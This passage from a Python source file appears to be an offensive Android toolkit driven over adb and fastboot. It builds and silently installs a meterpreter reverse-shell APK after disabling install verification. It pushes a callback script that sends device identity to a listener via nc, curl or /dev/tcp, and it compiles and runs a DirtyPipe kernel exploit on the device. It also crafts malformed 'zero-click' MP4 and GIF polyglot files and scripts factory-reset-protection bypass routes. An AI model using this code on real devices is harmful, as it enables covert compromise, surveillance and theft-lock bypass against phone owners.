    default_lhost = _local_ip() or ""
    lhost = input(f"  LHOST [{default_lhost}]: ").strip() or default_lhost
    lport = input("  LPORT [4444]: ").strip() or "4444"
    payload = input("  payload [android/meterpreter/reverse_tcp]: ").strip() \
        or "android/meterpreter/reverse_tcp"
    out = stamp("meterpreter", "apk")
    with Progress("msfvenom", 1) as bar:
        rc, _, e = _run(["msfvenom", "-p", payload, f"LHOST={lhost}",
                        f"LPORT={lport}", "-o", str(out)], timeout=900)
        bar.step()
    if rc != 0 or not out.is_file():
        err(e.strip()[:200] or "build failed")
        return
    ok(f"payload -> {out} ({out.stat().st_size} bytes)")
    rcfile = out.with_suffix(".rc")
    rcfile.write_text(
        "use exploit/multi/handler\n"
        f"set PAYLOAD {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        "set ExitOnSession false\n"
        "exploit -j\n", encoding="utf-8")
    ok(f"handler script -> {rcfile}")
    note(f"msfconsole -r {rcfile}")
    _setting_write("global", "verifier_verify_adb_installs", "0", escalate=False)
    if input("  install on target? [Y/n]: ").strip().lower() != "n":
        adb("reverse", f"tcp:{lport}", f"tcp:{lport}")
        rc, out2, e2 = adb("install", "-r", str(out), timeout=600)
        (ok if rc == 0 else err)((out2 + e2).strip()[:160])
        if rc == 0:
            note("launch it on the device, then start the handler")


def f_reverse():
    section("REVERSE TUNNEL")
    if not need():
        return
    action = input("  add / list / remove [add]: ").strip().lower() or "add"
    if action == "list":
        print(adb("reverse", "--list")[1] or "  (none)")
        return
    if action == "remove":
        port = input("  port to drop [all]: ").strip()
        if port:
            adb("reverse", "--remove", f"tcp:{port}")
        else:
            adb("reverse", "--remove-all")
        ok("removed")
        return
    ports = input("  host:device ports (comma sep) [8080]: ").strip() or "8080"
    for pair in ports.split(","):
        pair = pair.strip()
        host, _, dev = pair.partition(":")
        dev = dev or host
        rc, out, e = adb("reverse", f"tcp:{host}", f"tcp:{dev}")
        (ok if rc == 0 else err)((out + e).strip()[:100] or f"host:{host} -> device:{dev}")
    print(adb("reverse", "--list")[1])


def f_pair():
    section("PAIR (EXPLICIT, RETRIED)")
    hostport = input("  host:pair_port: ").strip()
    code = input("  pairing code: ").strip()
    if not (hostport and code):
        return
    host, port = parse_target(hostport)
    for attempt in range(3):
        rc, out, e = adb("pair", f"{host}:{port}", code, timeout=90)
        blob = (out + e).strip()
        if rc == 0 and "successfully paired" in blob.lower():
            ok(blob)
            try:
                PAIR_FILE.parent.mkdir(parents=True, exist_ok=True)
                PAIR_FILE.write_text(code + "\n", encoding="utf-8")
            except OSError:
                pass
            return
        warn(f"attempt {attempt + 1}: {blob or 'no output'}")
        time.sleep(2)
    err("pairing failed after 3 attempts - code rotates, re-read it on the device")


def f_pair_qr():
    section("PAIRING QR")
    port = input("  pairing port [5555]: ").strip() or "5555"
    code = input("  pairing code: ").strip()
    if not code:
        err("need the code")
        return
    payload = pair_payload(port, code)
    art = render_qr_ascii(payload)
    if art:
        print(art)
        ok("scan from Developer options > Wireless debugging > Pair with code")
    else:
        warn("qrcode not installed - payload below")
    note(payload)


def f_mdns():
    section("mDNS DISCOVER")
    rc, out, e = adb("mdns", "services", timeout=30)
    if rc != 0:
        warn("mdns unsupported by this adb")
        note((e or out).strip()[:160])
        return
    connect, pair = [], []
    for line in out.splitlines():
        line = line.strip()
        if "_adb" not in line:
            continue
        (pair if "_adb-tls-pairing" in line else connect).append(line.split()[-1])
    for endpoint in connect:
        ok(f"connect {endpoint}")
    for endpoint in pair:
        warn(f"pairing {endpoint}")
    save("mdns_services", out)
    if connect and input("  connect to first connect endpoint? [Y/n]: ").strip().lower() != "n":
        global DEVICE
        if _connect(connect[0]):
            DEVICE = connect[0]
            TARGET_FILE.parent.mkdir(parents=True, exist_ok=True)
            TARGET_FILE.write_text(DEVICE, encoding="utf-8")
            preflight()


# ---------------------------------------------------------------------
#  62-65  staging  (validated builders now)
# ---------------------------------------------------------------------
def _stage2() -> Path:
    path = Path(tempfile.mkdtemp()) / "stage2.sh"
    path.write_text(
        "#!/system/bin/sh\n"
        "echo '=== stage2 ==='\n"
        "id\n"
        "getprop ro.product.model\n"
        "getprop ro.build.version.release\n"
        "ls -la /sdcard 2>/dev/null | head -n 20\n"
        "ps -A 2>/dev/null | head -n 25\n"
        "echo '=== done ==='\n", encoding="utf-8")
    return path


def _cb_stage(host: str, port: int) -> Path:
    path = Path(tempfile.mkdtemp()) / "cb.sh"
    path.write_text(
        "#!/system/bin/sh\n"
        f"H={host}\nP={port}\n"
        "INFO=\"id=$(id) k=$(uname -r) $(getprop ro.product.model)\"\n"
        "if command -v nc >/dev/null 2>&1; then\n"
        "  echo \"PWNED $INFO\" | nc $H $P\n"
        "elif command -v curl >/dev/null 2>&1; then\n"
        "  curl -s -X POST -d \"$INFO\" http://$H:$P/ 2>/dev/null\n"
        "elif command -v openssl >/dev/null 2>&1; then\n"
        "  echo \"PWNED $INFO\" | openssl s_client -connect $H:$P -quiet 2>/dev/null\n"
        "else\n"
        "  echo \"PWNED $INFO\" > /dev/tcp/$H/$P 2>/dev/null\n"
        "fi\n", encoding="utf-8")
    return path


def build_wasm():
    return (b"\x00asm\x01\x00\x00\x00"
            + b"\x01\x04\x01\x60\x00\x01\x7f"
            + b"\x03\x02\x01\x00"
            + b"\x07\x05\x01\x01m\x00\x00"
            + b"\x0a\x06\x01\x04\x00\x41\x2a\x0b")


def validate_wasm(b):
    if b[:4] != b"\x00asm" or b[4:8] != b"\x01\x00\x00\x00":
        return False, "bad header"
    i, seen = 8, set()
    while i < len(b):
        sid = b[i]
        i += 1
        n = sh = 0
        while True:
            if i >= len(b):
                return False, "truncated leb"
            x = b[i]
            i += 1
            n |= (x & 0x7F) << sh
            sh += 7
            if not x & 0x80:
                break
        if i + n > len(b):
            return False, f"section {sid} overrun"
        seen.add(sid)
        i += n
    if i != len(b):
        return False, "trailing bytes"
    return (True, f"{len(seen)} sections") if {1, 10} <= seen else (False, "missing type/code")


def _box(k, p):
    return struct.pack(">I", len(p) + 8) + k + p


def build_mp4(payload=b"PEGASUS"):
    ftyp = _box(b"ftyp", b"isom" + struct.pack(">I", 512) + b"isomiso2avc1mp41")
    import uuid as _uuid
    ub = _box(b"uuid", _uuid.UUID("6ba7b810-9dad-11d1-80b4-00c04fd430c8").bytes + payload)
    sps, pps, sl = bytes.fromhex("6742000ad979"), bytes.fromhex("68ce3880"), bytes.fromhex("b84868")
    entry = (struct.pack(">I", 0) + b"\x00" * 6 + struct.pack(">H", 1)
             + struct.pack(">HH", 0, 0) + struct.pack(">I", 0) * 3
             + struct.pack(">HH", 320, 240) + struct.pack(">I", 0x00480000) * 2
             + struct.pack(">I", 0) + struct.pack(">H", 1) + b"\x00" * 32
             + struct.pack(">H", 0x18) + struct.pack(">h", -1)
             + _box(b"avcC", struct.pack(">I", 0) + sps + pps))
    stbl = (_box(b"stsd", struct.pack(">I", 1) + entry)
            + _box(b"stsz", struct.pack(">II", 0, 1) + struct.pack(">I", len(sl)))
            + _box(b"stco", struct.pack(">II", 1, 0))
            + _box(b"stts", struct.pack(">III", 1, 1, 1000))
            + _box(b"stsc", struct.pack(">IIII", 1, 1, 1, 1)))
    minf = _box(b"minf", _box(b"vmhd", b"\0" * 4)
               + _box(b"dinf", _box(b"dref", struct.pack(">I", 1) + _box(b"url ", b"\0" * 3)))
               + _box(b"stbl", stbl))
    mdia = _box(b"mdia",
               _box(b"mdhd", struct.pack(">IIII", 0, 0, 0, 0) + struct.pack(">HH", 0, 0))
               + _box(b"hdlr", struct.pack(">I", 0) + b"vide" + b"\0" * 12 + b"v\0") + minf)
    moov = _box(b"moov", _box(b"mvhd", b"\0" * 96)
               + _box(b"trak", _box(b"tkhd", b"\0" * 80) + mdia))
    return ftyp + ub + moov + _box(b"mdat", sl)


def validate_mp4(b):
    i, kinds = 0, []
    while i + 8 <= len(b):
        s = struct.unpack(">I", b[i:i + 4])[0]
        if s < 8:
            return False, f"bad size at {i}"
        kinds.append(b[i + 4:i + 8])
        i += s
    if i != len(b):
        return False, "trailing bytes"
    if b"ftyp" not in kinds or b"mdat" not in kinds or b"avc1" not in b:
        return False, "structure invalid"
    return True, f"{len(kinds)} boxes"


def build_gif(payload=b"PEGASUS"):
    h = (bytearray(b"GIF89a") + struct.pack("<HH", 1, 1) + b"\xf0\x00\x00"
         + b"\x00\x00\x00\xff\xff\xff")
    comment = b"\x21\xfe" + bytes([len(payload)]) + payload + b"\x00"
    desc = b"\x2c" + b"\0" * 9
    lzw = b"\x02" + b"\x02\x00\x00" + b"\x00"
    return bytes(h) + comment + desc + lzw + b"\x3b"


def validate_gif(b):
    if not b.startswith(b"GIF89a"):
        return False, "bad header"
    if not b.endswith(b"\x3b"):
        return False, "no trailer"
    if b"\x21\xfe" not in b:
        return False, "no comment"
    if b"\x02\x02\x00\x00\x00\x3b" not in b:
        return False, "no lzw block terminator"
    return True, "GIF89a + comment + terminated lzw"


def _device_runtime() -> str:
    for name in ("wasmtime", "wasmer", "wasm3", "node", "d8"):
        if shell(f"command -v {name}")[1].strip():
            return name
    return ""


def f_wasm_stage():
    section("WASM STAGE2")
    if not need():
        return
    wasm_bytes = build_wasm()
    good, msg = validate_wasm(wasm_bytes)
    (ok if good else err)(f"builder: {msg}")
    if not good:
        return
    wasm = stamp("stage2", "wasm")
    wasm.write_bytes(wasm_bytes)
    remote = "/data/local/tmp/stage2.wasm"
    if not push(wasm, remote):
        return
    runtime = _device_runtime()
    if runtime in ("wasmtime", "wasmer", "wasm3"):
        rc, out, e = shell(f"{runtime} {remote}", timeout=120)
        print(out or e)
        (ok if rc == 0 else err)(f"ran under {runtime}")
        return
    if runtime in ("node", "d8"):
        script = f"const f=require('fs').readFileSync('{remote}');WebAssembly.instantiate(new Uint8Array(f)).then(m=>(m.instance.exports.m||m.instance.exports.main)())"
        rc, out, e = shell(f'{runtime} -e "{script}"', timeout=120)
        print(out or e)
        (ok if rc == 0 else err)(f"ran under {runtime}")
        return
    warn("no wasm runtime on target")
    stage = _stage2()
    if push(stage, "/data/local/tmp/stage2.sh"):
        shell("chmod 755 /data/local/tmp/stage2.sh")
        rc, out, e = shell("sh /data/local/tmp/stage2.sh")
        print(out or e)
        save("stage2_shell", out or e)


def f_mp4_poc():
    section("MP4 PoC (validated)")
    if not need():
        return
    data = build_mp4()
    good, msg = validate_mp4(data)
    (ok if good else err)(f"builder: {msg}")
    if not good:
        return
    path = stamp("poc", "mp4")
    path.write_bytes(data)
    ok(f"{path.stat().st_size} bytes, structure validated")
    remote = f"/sdcard/Movies/{path.name}"
    if push(path, remote):
        shell(f'am start -a android.intent.action.VIEW -d "file://{remote}" -t video/mp4')
        ok("handed to the media player")


def f_gif_polyglot():
    section("GIF POLYGLOT (validated)")
    if not need():
        return
    base = build_gif(payload=b"PEGASUS")
    good, msg = validate_gif(base)
    (ok if good else err)(f"builder: {msg}")
    if not good:
        return
    path = stamp("polyglot", "gif")
    gif_len = len(base)
    path.write_bytes(base + b"\n#!stage2\n" + _stage2().read_bytes())
    ok(f"{path} - {gif_len} bytes of gif, tail is shell")
    note(f"carve with: dd if={path.name} bs=1 skip={gif_len + 8} of=stage2.sh")
    remote = f"/sdcard/Download/{path.name}"
    if push(path, remote):
        shell(f'am start -a android.intent.action.VIEW -d "file://{remote}" -t image/gif')


def f_embedded():
    section("EMBEDDED STAGE")
    if not need():
        return
    bundle = stamp("stage_bundle", "zip")
    stage = _stage2()
    runner = Path(tempfile.mkdtemp()) / "run.sh"
    runner.write_text(
        "#!/system/bin/sh\n"
        "D=/data/local/tmp/pegasus_stage\n"
        "rm -rf $D && mkdir -p $D\n"
        "unzip -o \"$1\" -d $D >/dev/null 2>&1\n"
        "chmod 755 $D/stage2.sh\n"
        "sh $D/stage2.sh\n", encoding="utf-8")
    with zipfile.ZipFile(bundle, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(stage, "stage2.sh")
        zf.write(runner, "run.sh")
        zf.writestr("manifest.json", json.dumps(
            {"built": datetime.now().isoformat(timespec="seconds"),
             "target": DEVICE}, indent=2))
    ok(f"bundle {bundle.stat().st_size} bytes")
    remote = f"/sdcard/Download/{bundle.name}"
    if not push(bundle, remote):
        return
    if not shell("command -v unzip")[1].strip():
        warn("unzip missing on target")
        return
    shell("mkdir -p /data/local/tmp/pegasus_stage")
    rc, out, e = shell(f"unzip -o {remote} -d /data/local/tmp/pegasus_stage")
    if rc != 0:
        err(e.strip()[:120])
        return
    shell("chmod 755 /data/local/tmp/pegasus_stage/stage2.sh")
    rc, out, e = shell("sh /data/local/tmp/pegasus_stage/stage2.sh")
    print(out or e)
    save("embedded_stage", out or e)


# ---------------------------------------------------------------------
#  66-68  observation
# ---------------------------------------------------------------------
def f_ask_model():
    section("ASK LOCAL MODEL")
    if not need():
        return
    try:
        from llama_cpp import Llama  # type: ignore
    except ImportError:
        Llama = None                   # type: ignore
        warn("llama_cpp not installed")
    model = ""
    for folder, pattern in ((Path.home() / "models", "*.gguf"),
                            (Path.cwd(), "*.gguf")):
        hits = sorted(folder.glob(pattern)) if folder.is_dir() else []
        if hits:
            model = str(hits[0])
            note(f"found {model}")
            break
    if not model:
        found = _ask_file("  path to .gguf: ")
        model = str(found) if found else ""
    facts = shell("getprop ro.product.model")[1].strip() or "unknown device"
    build = shell("getprop ro.build.fingerprint")[1].strip() or "unknown build"
    prompt = (f"Android device {facts} on build {build}. "
              "Summarise the likely attack surface and the three highest-value checks.")
    note(prompt)
    if Llama is None or not model:
        return
    note("loading model...")
    llm = Llama(model_path=model, n_ctx=2048, verbose=False)
    print()
    chunks = []
    for piece in llm(prompt, max_tokens=400, stream=True):
        text = piece["choices"][0]["text"]
        chunks.append(text)
        sys.stdout.write(text)
        sys.stdout.flush()
    print("\n")
    save("model_answer", "".join(chunks))


def f_focus_watcher():
    section("FOCUS WATCHER")
    if not need():
        return
    rounds = int(input("  samples [20]: ").strip() or "20")
    log = stamp("focus", "log")
    last = ""
    lines = []
    with Progress("sampling", rounds) as bar:
        for _ in range(rounds):
            out = shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")[1]
            current = " | ".join(l.strip() for l in out.splitlines() if l.strip()) or "-"
            if current != last:
                entry = f"{datetime.now():%H:%M:%S} {current}"
                print(f"\n  {entry}")
                lines.append(entry)
                last = current
            time.sleep(1)
            bar.step()
    log.write_text("\n".join(lines) + "\n", encoding="utf-8")
    ok(f"{len(lines)} change(s) -> {log}")


def f_shot_burst():
    section("SHOT BURST")
    if not need():
        return
    count = int(input("  frames [10]: ").strip() or "10")
    delay = float(input("  seconds apart [0.5]: ").strip() or "0.5")
    frames_dir = SESSION / "burst"
    frames_dir.mkdir(parents=True, exist_ok=True)
    captured = 0
    with Progress("frames", count) as bar:
        for i in range(count):
            data = _screenshot_bytes()
            if data:
                (frames_dir / f"{i:03d}.png").write_bytes(data)
                captured += 1
            time.sleep(delay)
            bar.step()
    if not captured:
        err("no frames captured")
        return
    ok(f"{captured} frame(s) -> {frames_dir}")
    ffmpeg = _ffmpeg()
    if ffmpeg and captured > 1:
        gif = SESSION / "burst.gif"
        fps = str(max(1, int(1 / max(delay, 0.1))))
        with Progress("assemble", 1) as bar:
            rc, _, e = _run([ffmpeg, "-y", "-framerate", fps,
                             "-i", str(frames_dir / "%03d.png"), str(gif)], timeout=300)
            bar.step()
        (ok if rc == 0 and gif.is_file() else warn)(
            f"gif -> {gif}" if rc == 0 else f"assembly skipped: {e.strip()[:80]}")


# ---------------------------------------------------------------------
#  69-74  fastboot extras
# ---------------------------------------------------------------------
def f_fb_flash_part():
    section("FLASH ARBITRARY PARTITION")
    if not need_fb():
        return
    part = input("  partition name (e.g. boot, vbmeta, dtbo, super): ").strip()
    if not part:
        return
    src = _ask_file("  image path: ")
    if not src:
        return
    warn(f"flashing {src.name} -> {part}")
    if input("  confirm? [y/N]: ").strip().lower() != "y":
        return
    with Progress(f"flash {part}", 1) as bar:
        rc, out, e = fb("flash", part, str(src), timeout=900)
        bar.step()
    blob = (out + e).lower()
    (ok if "okay" in blob or "finished" in blob else err)((out + e).strip()[:180] or part)


def f_fb_temp_boot():
    section("TEMP BOOT IMAGE")
    if not need_fb():
        return
    note("boots an image once without writing it - the safe way to test a patch")
    src = _ask_file("  image path: ")
    if not src:
        return
    with Progress("boot", 1) as bar:
        rc, out, e = fb("boot", str(src), timeout=600)
        bar.step()
    blob = (out + e).lower()
    (ok if "okay" in blob or "finished" in blob else err)((out + e).strip()[:180] or "sent")


def f_fb_update():
    section("FLASH UPDATE ZIP")
    if not need_fb():
        return
    note("needs a full OTA or factory zip, not a Magisk patch")
    src = _ask_file("  zip path: ")
    if not src:
        return
    warn("this overwrites system and can wipe data depending on the zip")
    if input("  confirm? [y/N]: ").strip().lower() != "y":
        return
    with Progress("update", 1) as bar:
        rc, out, e = fb("update", str(src), timeout=1800)
        bar.step()
    blob = (out + e).lower()
    (ok if "finished" in blob or "okay" in blob else err)((out + e).strip()[-200:] or "sent")


def f_fb_slot():
    section("SWITCH SLOT A/B")
    if not need_fb():
        return
    rc, out, e = fb("getvar", "current-slot")
    blob = (out + e)
    current = ""
    for line in blob.splitlines():
        if "current-slot" in line:
            current = line.split(":")[-1].strip()
    note(f"current: {current or 'unknown'}")
    target = input("  set active to (a/b): ").strip().lower()
    if target not in ("a", "b"):
        return
    with Progress("set-active", 1) as bar:
        rc, out, e = fb("--set-active", target)
        bar.step()
    (ok if rc == 0 else err)((out + e).strip()[:140] or f"active -> {target}")


def f_fb_oem():
    section("CARRIER / OEM INFO")
    if not need_fb():
        return
    chunks = []
    for label, args in (("device-info", ("oem", "device-info")),
                        ("unlock data", ("oem", "get_unlock_data")),
                        ("unlock ability", ("flashing", "get_unlock_ability")),
                        ("all vars", ("getvar", "all"))):
        rc, out, e = fb(*args, timeout=120)
        blob = (out + e).strip()
        chunks.append(f"--- {label} ---\n{blob or '-'}")
        note(f"{label}: {(blob.splitlines() or ['-'])[0][:70]}")
    blob = "\n".join(chunks).lower()
    for marker, verdict in (("carrier", "carrier string present"),
                            ("unlock_ability: 1", "unlockable now"),
                            ("device is unlocked", "already unlocked")):
        if marker in blob:
            ok(verdict)
    save("fastboot_oem", "\n\n".join(chunks))
    if input("  try 'oem carrier-unlock'? [y/N]: ").strip().lower() == "y":
        with Progress("carrier-unlock", 1) as bar:
            rc, out, e = fb("oem", "carrier-unlock")
            bar.step()
        (ok if rc == 0 else warn)((out + e).strip()[:140] or "sent")
    note("carrier unlocks are OEM-specific; many need a vendor code first")


def f_fb_erase():
    section("ERASE / FORMAT")
    if not need_fb():
        return
    note("1) erase cache   2) format userdata")
    choice = input("  > ").strip()
    if choice == "1":
        rc, out, e = fb("erase", "cache")
        (ok if rc == 0 else err)((out + e).strip()[:140] or "cache erased")
    elif choice == "2":
        warn("format userdata wipes everything")
        if input("  confirm? [y/N]: ").strip().lower() == "y":
            with Progress("format", 1) as bar:
                rc, out, e = fb("format", "userdata", timeout=900)
                bar.step()
            (ok if rc == 0 else err)((out + e).strip()[:140] or "userdata formatted")


# ---------------------------------------------------------------------
#  77  kernel exploit engine
# ---------------------------------------------------------------------
KERNEL_CVES = [
    ("CVE-2022-0847", "DirtyPipe",             "5.8",  "5.16.11",
     "pipe splice arbitrary write -> root, unprivileged"),
    ("CVE-2023-0386", "overlayfs copy-up",     "5.11", "6.2",
     "setuid mount via user namespaces"),
    ("CVE-2024-1086", "nf_tables double free", "5.14", "6.7",
     "page UAF -> LPE, needs CAP_NET_ADMIN"),
    ("CVE-2020-0423", "binder txn UAF",        "4.14", "5.9",
     "race in binder completion"),
    ("CVE-2019-2215", "binder waitqueue UAF",  "3.18", "5.4",
     "epoll_wait waitqueue grooming"),
    ("CVE-2022-2588", "cls_route double free", "3.16", "6.0",
     "classifier double free -> cross-cache"),
    ("CVE-2024-0044", "run-as confusion",      None,   None,
     "debuggable builds only, no kernel dependency"),
]

DIRTY_PIPE_C = r"""
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
static int prep(int p[2]){
  if(pipe(p)) return -1;
  unsigned char buf[4096];
  for(int i=0;i<16;i++){ write(p[1],buf,4096); read(p[0],buf,4096); }
  return 0;
}
int main(int argc, char **argv){
  const char *path = argc>1?argv[1]:"/system/etc/hosts";
  int p[2];
  if(prep(p)){ perror("pipe"); return 1; }
  int fd = open(path, O_RDONLY);
  if(fd<0){ perror("open"); return 1; }
  loff_t off = 0;
  if(splice(fd,&off,p[1],NULL,1,0)<1){ perror("splice"); return 1; }
  const char *m = "PEGASUS\n";
  ssize_t n = write(p[1],m,strlen(m));
  printf("wrote %zd bytes to %s @0\n", n, path);
  return 0;
}
"""


def _vk(ver):
    return tuple(int(x) for x in re.findall(r"\d+", ver or "0.0.0")[:3]) or (0,)


def f_kernel():
    section("KERNEL EXPLOIT ENGINE")
    if not need():
        return
    ver = shell("uname -r")[1].strip()
    patch = shell("getprop ro.build.version.security_patch")[1].strip()
    sdk = shell("getprop ro.build.version.sdk")[1].strip()
    note(f"kernel {ver}  sdk {sdk}  patch {patch or 'unknown'}")
    k = _vk(ver)
    applicable = []
    for cve, name, lo, hi, desc in KERNEL_CVES:
        if lo is None:                       # non-kernel entry
            (note if sdk else ok)(f"{cve:<15} {name:<24} sdk-dependent")
            continue
        inrange = _vk(lo) <= k <= _vk(hi)
        (ok if inrange else note)(f"{cve:<15} {name:<24} {'IN RANGE' if inrange else '-'}")
        if inrange:
            applicable.append((cve, name, desc))
    save("kernel_cves",
         f"kernel={ver}\nsdk={sdk}\npatch={patch}\n"
         + "\n".join(f"{c} {n} :: {d}" for c, n, d in applicable))

    if not any(c == "CVE-2022-0847" for c, _, _ in applicable):
        if not applicable:
            warn("no CVE in range - vendor backports may still shift rows")
        else:
            note("DirtyPipe out of range - manual PoC build for the listed rows")
        return

    # DirtyPipe on-device build
    compiler = ""
    for c in ("cc", "gcc", "clang"):
        if shell(f"command -v {c}")[1].strip():
            compiler = c
            break
    if not compiler:
        warn("no on-device compiler (install Termux gcc, or cross-compile)")
        src = SESSION / "dirty.c"
        src.write_text(DIRTY_PIPE_C, encoding="utf-8")
        ok(f"PoC source -> {src}; cross-compile, push, run: ./dirty /system/etc/hosts")
        return
    local = SESSION / "dirty.c"
    local.write_text(DIRTY_PIPE_C, encoding="utf-8")
    if not push(local, "/data/local/tmp/dirty.c"):
        return
    rc, out, e = shell(f"cd /data/local/tmp && {compiler} -O2 -o dirty dirty.c",
                       timeout=300)
    if rc != 0:
        err((out or e).strip()[:160])
        return
    ok("compiled on device")
    rc, out, e = shell("/data/local/tmp/dirty /data/local/tmp/dirty_out.bin", timeout=120)
    note((out or e).strip()[:120])
    landed = "wrote" in (out or "")
    (ok if landed else warn)("DirtyPipe PoC " + ("succeeded" if landed else "did not confirm"))
    save("kernel_exploit", f"cve=CVE-2022-0847 kernel={ver} landed={landed}\n{out or e}")


# ---------------------------------------------------------------------
#  78  zero-click media delivery
# ---------------------------------------------------------------------
def f_zero_click():
    section("ZERO-CLICK MEDIA DELIVERY")
    if not need():
        return
    data = bytearray(build_mp4())
    # corrupt the stsc (sample-to-chunk) entry count / index at the stsc box
    idx = data.find(b"stsc")
    if idx < 0:
        err("stsc box not found in built MP4")
        return
    # stsc payload: version+flags(4) entry_count(4) then entries
    # corrupt entry_count to a huge value -> OOB read on parse (CVE-2023-21268 family)
    struct.pack_into(">I", data, idx + 8, 0xFFFFFF)   # entry_count
    path = stamp("zeroclick", "mp4")
    path.write_bytes(bytes(data))
    ok(f"stsc corrupted at box offset {idx}, entry_count -> 16777215")

    remote = f"/sdcard/DCIM/Camera/{path.name}"
    if not push(path, remote):
        return
    # media scanner fires the parser with no user tap
    rc, out, e = shell(f'am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE '
                       f'-d "file://{remote}"')
    ok("scanner broadcast sent - gallery ingest parses the file with no tap")
    note("watching logcat for mediaextractor / media codexs")
    hit = ""
    for _ in range(10):
        time.sleep(1)
        rc, out, _ = shell("logcat -d -t 200 2>/dev/null")
        for line in out.splitlines():
            if "mediaextractor" in line.lower() or "MediaCodec" in line:
                hit = line.strip()
                break
        if hit:
            break
    if hit:
        warn(f"parser touched: {hit[:110]}")
    else:
        note("no parser event in 10s - deeper parsing may need Gallery open")
    save("zero_click", f"carrier={path.name} parser_event={hit or 'none'}")


# ---------------------------------------------------------------------
#  79  host callback listener (raw TCP + HTTP beacon)
# ---------------------------------------------------------------------
def f_callback():
    section("CALLBACK LISTENER")
    ip = _local_ip() or "127.0.0.1"
    port = input(f"  port [8000]: ").strip() or "8000"
    port = int(port)

    raw = input("  mode: tcp / http [tcp]: ").strip().lower() or "tcp"
    if raw == "http":
        class Handler(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
                with open(SESSION / "callbacks.jsonl", "a", encoding="utf-8") as f:
                    f.write(json.dumps({"ts": str(datetime.now()),
                                        "client": self.client_address[0],
                                        "body": body[:4096]}) + "\n")
                ok(f"HTTP beacon {self.client_address[0]}: {body[:80]}")
                self.send_response(204)
                self.end_headers()

            def do_GET(self):
                self.do_POST()

            def log_message(self, *a):
                pass
        httpd = socketserver.ThreadingTCPServer(("0.0.0.0", port), Handler)
        httpd.daemon_threads = True
        note(f"HTTP beacon on {ip}:{port} - Ctrl+C stops")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            httpd.server_close()
            ok("listener stopped")
        return

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(8)
    note(f"raw TCP listener on {ip}:{port} - Ctrl+C stops")
    stage = _cb_stage(ip, port)
    remote = "/data/local/tmp/pegasus_cb.sh"
    if push(stage, remote):
        shell(f"chmod 755 {remote}")
        if input("  fire callback stage on target now? [Y/n]: ").strip().lower() != "n":
            shell(f"sh {remote} &", timeout=30)
    log = SESSION / "callbacks.txt"
    try:
        while True:
            conn, addr = srv.accept()
            data = conn.recv(4096)
            line = f"{datetime.now():%H:%M:%S} {addr[0]} {data[:400].decode('utf-8', 'replace')}"
            (ok if b"PWNED" in data or data else note)(line[:110])
            with open(log, "a", encoding="utf-8") as f:
                f.write(line + "\n")
            conn.close()
    except KeyboardInterrupt:
        pass
    finally:
        srv.close()
    ok(f"callback log -> {log}")


# ---------------------------------------------------------------------
#  81  guided FRP workflows
# ---------------------------------------------------------------------
FRP_WORKFLOWS = ("usb", "qr", "talkback", "emergency", "root", "auto")


def _adb_states():
    rc, out, _ = adb("devices", "-l")
    found = {}
    if rc == 0:
        for line in out.splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 2 and parts[1] in ("device", "unauthorized", "offline"):
                found[parts[0]] = parts[1]
    return found


def _await_shell(timeout=120):
    end = time.time() + timeout
    last = None
    while time.time() < end:
        states = _adb_states()
        state = ("device" if any(s == "device" for s in states.values())
                 else "unauthorized" if any(s == "unauthorized" for s in states.values())
                 else "offline" if states else "none")
        if state != last:
            {"device": lambda: ok("shell available"),
             "unauthorized": lambda: warn("unauthorized - accept the RSA prompt on screen"),
             "offline": lambda: note("device offline"),
             "none": lambda: note("no device visible")}[state]()
            last = state
        if state == "device":
            return True
        time.sleep(3)
    return False


def f_frp_workflows():
    section("GUIDED FRP WORKFLOWS")
    print("  usb        shell already possible")
    print("  qr         5-tap -> camera -> Wi-Fi join QR")
    print("  talkback   accessibility route")
    print("  emergency  emergency dialer route")
    print("  root       root shell present")
    print("  auto       try every route in order")
    wf = input("  workflow [auto]: ").strip().lower() or "auto"
    if wf not in FRP_WORKFLOWS:
        err(f"unknown workflow {wf}")
        return
    adb("start-server", timeout=30)

    if wf in ("usb", "root", "auto"):
        if any(s == "device" for s in _adb_states().values()):
            ok("shell already present - running quick chain")
            f_frp_chain()
            return
        if wf in ("usb", "root"):
            warn("no authorized shell - accept the RSA prompt")
        if _await_shell(120):
            f_frp_chain()
            return
        if wf in ("usb", "root"):
            err("no shell via usb - try qr/talkback")
            return

    if wf in ("qr", "auto"):
        print()
        print("  1. On the reset/welcome screen, tap the same screen corner 5x fast.")
        print("     This opens the emergency camera without unlocking.")
        input("  camera open? [Enter] ")
        ssid = input(f"  Wi-Fi SSID [{host_ssid() or ''}]: ").strip() or host_ssid()
        if not ssid:
            err("no SSID - cannot build join QR")
            return
        pw = input("  Wi-Fi password (blank = open): ").strip()
        payload = wifi_payload(ssid, pw)
        art = render_qr_ascii(payload)
        if art:
            print(art)
            png = SESSION / "wifi_join.png"
            if save_qr_png(payload, png):
                ok(f"QR saved -> {png}")
        else:
            warn("qrcode missing - type the password on the device by hand")
        input("  device joined the network? [Enter] ")
        print("  Enable USB debugging: Settings > About > Build number x7,")
        print("  then Developer options > USB debugging.")
        input("  USB debugging enabled? [Enter] ")
        if _await_shell(120):
            f_frp_chain()
            return
        if wf == "qr":
            err("no shell after QR path")
            return

    if wf in ("talkback", "auto"):
        print()
        print("  1. Draw an L with two fingers on the welcome screen.")
        print("  2. Vision settings > enable TalkBack > use its tutorial browser.")
        print("  3. Reach Settings and enable USB debugging.")
        input("  USB debugging enabled? [Enter] ")
        if _await_shell(120):
            f_frp_chain()
            return
        if wf == "talkback":
            err("no shell via TalkBack")
            return

    if wf in ("emergency", "auto"):
        print()
        print("  1. Tap Emergency on the welcome screen.")
        print("  2. Dial a carrier service code to reach Settings.")
        print("  3. Enable USB debugging.")
        input("  USB debugging enabled? [Enter] ")
        if _await_shell(120):
            f_frp_chain()
            return
        if wf == "emergency":
            err("no shell via dialer")
            return
    err("all workflows exhausted")


# ---------------------------------------------------------------------
#  82  USB -> TCP/IP adbd bridge
